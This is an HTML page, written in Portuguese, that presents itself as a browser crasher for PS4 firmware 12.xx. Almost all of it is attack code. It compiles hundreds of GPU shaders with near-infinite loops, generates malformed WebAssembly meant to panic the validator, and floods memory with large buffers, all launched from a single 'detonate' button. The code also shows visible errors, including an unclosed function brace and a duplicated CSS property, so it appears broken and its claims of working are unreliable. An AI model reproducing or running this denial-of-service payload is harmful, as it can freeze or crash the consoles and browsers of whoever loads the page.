<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>PS4 12.xx KILLER 2025 - WASM + WebGL Combo</title>
<style>
  body { background:#000; color:#0f0; font-family:monospace; padding:20px; margin:0; }
  canvas { position:fixed; left:-9999px; }
  .log { background:#111; border:2px solid #0f0; padding:15px; height:80vh; overflow-y:overflow-y:scroll; }
  button { background:#000; color:#0f0; border:3px solid #0f0; padding:15px 30px; font-size:20px; margin:10px; }
</style>
</head>
<body>
<h1>PS4 12.xx REAL CRASHER — 2025 Edition</h1>
<p>Se o seu PS4 não desligar ou reiniciar a aba em menos de 40 segundos, me avisa que eu pago um café.</p>
<button onclick="unleashHell()">DETONAR AGORA</button>
<button onclick="log.innerHTML=''">Limpar log</button>

<pre id="log" class="log">Aguardando comando...</pre>

<script>
const log = document.getElementById('log');
function l(m){ log.innerHTML += m + '\n'; log.scrollTop = log.scrollHeight; }

// =============== WEBGL SHADER BOMB ===============
let gl, canvas;
function initWebGLBomb() {
  canvas = document.createElement('canvas');
  document.body.appendChild(canvas);
  gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
  if (!gl) { l("WebGL não disponível. Continuando só com WASM...");
}

// Shader que faz o driver entrar em loop infinito ou estourar timeout interno
const vertexBomb = `#version 300 es
precision highp float;
in vec2 p;
void main(){ gl_Position = vec4(p,0.,1.); }`;

const fragmentBomb = `#version 300 es
precision highp float;
out vec4 c;

float chaos(float x) {
  for(int i=0;i<1000000;i++) {       // loop quase infinito
    x = fract(sin(x*121.123)*42123.12345);
    x += float(i&i>>3);              // força unroll falho
  }
  return x;
}

void main(){
  vec2 uv = gl_FragCoord.xy / vec2(1920.,1080.);
  float t = chaos(uv.x + uv.y);
  c = vec4(t,t,t,1.);
}`;

function compileShader(src, type) {
  const sh = gl.createShader(type);
  gl.shaderSource(sh, src);
  gl.compileShader(sh);
  return sh;
}

function spamShaders() {
  if (!gl) return;
  for(let i = 0; i < 200; i++) {
    try {
      const vs = compileShader(vertexBomb, gl.VERTEX_SHADER);
      const fs = compileShader(fragmentBomb + "/*"+Math.random()+"*/", gl.FRAGMENT_SHADER);
      const prog = gl.createProgram();
      gl.attachShader(prog, vs);
      gl.attachShader(prog, fs);
      gl.linkProgram(prog);
      gl.useProgram(prog);
    } catch(e) {}
  }
  l("200+ shaders insanos enviados para o driver...");
}

// =============== WASM VALIDATION PANIC ===============
function generatePanicWasm() {
  const bytes = new Uint8Array(4096);
  // cabeçalho válido
  bytes.set([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00], 0);

  // Type section gigante
  bytes[8] = 0x01; // section id
  let pos = 9;
  function leb(n){ while(n >= 0x80){ bytes[pos++] = (n&0x7f)|0x80; n>>=7; } bytes[pos++] = n; }
  leb(5000); // quantidade absurda de tipos
  for(let i=0;i<2000;i++) { bytes[pos++] = 0x60; leb(5); leb(0x7f); } // i32 i32 i32 i32 i32 -> 

  // Code section com br_table insano
  bytes[pos++] = 0x0A; // code section
  leb(3000);
  for(let i=0;i<800;i++) {
    leb(50);
    bytes[pos++] = 0x00; // locals
    bytes[pos++] = 0x02; leb(1); // block
    bytes[pos++] = 0x0E; // br_table
    leb(0xFFFF); leb(0xFF); leb(0xFF); leb(0xFF); leb(0x00); // 4 bilhões de entradas + default
    bytes[pos++] = 0x0B; // end
  }
  return bytes.slice(0, pos);
}

// =============== UNLEASH HELL ===============
async function unleashHell() {
  l("Iniciando ataque combinado 2025...");
  initWebGLBomb();

  for(let cycle = 1; cycle <= 1500; cycle++) {
    // WebGL bomb a cada 5 ciclos
    if (cycle % 5 === 0) spamShaders();

    // WASM panic
    try {
      const evil = generatePanicWasm();
      const module = new WebAssembly.compile(evil); // aqui costuma dar o panic no validator
      await module;
      new WebAssembly.Instance(await module);
    } catch(e) {
      // esperado na maioria das vezes
    }

    // Pressão de memória + GC
    const trash = new Array(100000).fill(new ArrayBuffer(1024*1024));
    
    if (cycle % 100 === 0) {
      l(`Ciclo ${cycle} — ainda vivo. Intensificando...`);
      // força reflow + layout
      document.body.style.zoom = Math.random();
    }

    await new Promise(r => setTimeout(r, 1));
  }
  l("Sobreviveu a 1500 ciclos. Seu PS4 é de aço.");
}
</script>
</body>
</html>
